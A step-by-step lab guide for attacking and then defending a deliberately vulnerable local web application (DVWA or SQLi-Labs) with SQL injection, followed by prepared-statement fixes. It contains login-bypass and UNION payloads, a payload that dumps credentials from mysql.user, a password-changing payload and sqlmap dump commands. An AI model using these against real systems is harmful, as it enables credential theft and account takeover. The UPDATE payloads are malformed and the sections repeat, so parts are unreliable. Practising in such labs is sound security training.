SQL Injection Attack and Prevention 


    Application: SQLi-Labs or DVWA (Damn Vulnerable Web Application)
    Database: MySQL
    Server: Apache or Nginx
    Programming Language: PHP (or any suitable web application stack)
    Virtualization: VirtualBox or Docker

Steps:

    Install and Configure MySQL:
        Set up a MySQL database with example tables relevant to a banking application (e.g., users, transactions).
        Populate the database with dummy data.

    Deploy SQLi-Labs or DVWA:
        Download and configure SQLi-Labs or DVWA on the server.
        Ensure the application is connected to the MySQL database.

    Set Up the Web Server:
        Configure Apache or Nginx to serve the vulnerable application.
        Ensure the web server and application are running correctly.

2. Identify SQL Injection Points

Manual Testing:

    Identify Input Fields: Look for input fields such as login forms, search bars, and URL parameters.
    Inject Payloads: Manually inject payloads like ' OR 1=1 -- and observe the responses.
    Error Messages: Look for SQL error messages or unusual behavior indicating potential vulnerabilities.

Automated Testing with SQLmap:

    Install SQLmap: Ensure SQLmap is installed on your testing environment.
    Run SQLmap: Use SQLmap to automate the detection of SQL injection points. Example command:

    bash

    sqlmap -u "http://localhost/vulnerable_app/login.php?username=admin&password=admin" --batch

    Analyze Results: Review SQLmap's findings to identify vulnerable endpoints and parameters.

3. Exploit the Vulnerability

Retrieve Sensitive Information:

    Use SQL injection to extract sensitive data from the database. Example payload:

    sql

    ' UNION SELECT username, password FROM users --

Modify Data:

    Demonstrate modifying database records via SQL injection. Example payload:

    sql

    ' UPDATE users SET password='newpassword' WHERE username='admin' --

Privilege Escalation:

    Use SQL injection to escalate privileges, such as gaining admin access.

4. Implement and Document Prevention Techniques

Prepared Statements:

    Refactor the vulnerable code to use prepared statements. Example in PHP:

    php

    $stmt = $conn->prepare("SELECT * FROM users WHERE username = ? AND password = ?");
    $stmt->bind_param("ss", $username, $password);
    $stmt->execute();

Parameterized Queries:

    Ensure all database queries use parameterized queries to prevent injection.

Input Validation and Sanitization:

    Implement robust input validation and sanitization to reject malicious input.

Stored Procedures:

    Use stored procedures to encapsulate database logic and reduce injection risk.

Web Application Firewall (WAF):

    Deploy a WAF to detect and block SQL injection attempts.

5. Provide a Comprehensive Report

sql

CREATE DATABASE banking_db;
USE banking_db;

CREATE TABLE users (
    id INT AUTO_INCREMENT PRIMARY KEY,
    username VARCHAR(50) NOT NULL,
    password VARCHAR(50) NOT NULL
);

INSERT INTO users (username, password) VALUES ('admin', 'admin123'), ('user1', 'userpass1');

Deploy DVWA:

bash

git clone https://github.com/digininja/DVWA.git /var/www/html/dvwa
cd /var/www/html/dvwa/config
cp config.inc.php.dist config.inc.php
nano config.inc.php  # Update database credentials

Configure Apache:

bash

sudo apt-get install apache2
sudo systemctl start apache2

Access DVWA:

    Open a browser and go to http://localhost/dvwa.

2. Identify Vulnerabilities

Manual Testing:

    Login Form:

    sql

    ' OR '1'='1

Automated Testing with SQLmap:

bash

sqlmap -u "http://localhost/dvwa/login.php?username=admin&password=admin" --batch --dump

3. Exploit Vulnerabilities

Retrieve Information:

sql

' UNION SELECT user, password FROM mysql.user --

Modify Data:

sql

' UPDATE dvwa.users SET password='newpassword' WHERE username='admin' --

4. Implement Prevention

PHP Prepared Statements:

php

<?php
$conn = new mysqli($servername, $username, $password, $dbname);

$stmt = $conn->prepare("SELECT * FROM users WHERE username = ? AND password = ?");
$stmt->bind_param("ss", $username, $password);
$stmt->execute();
?>
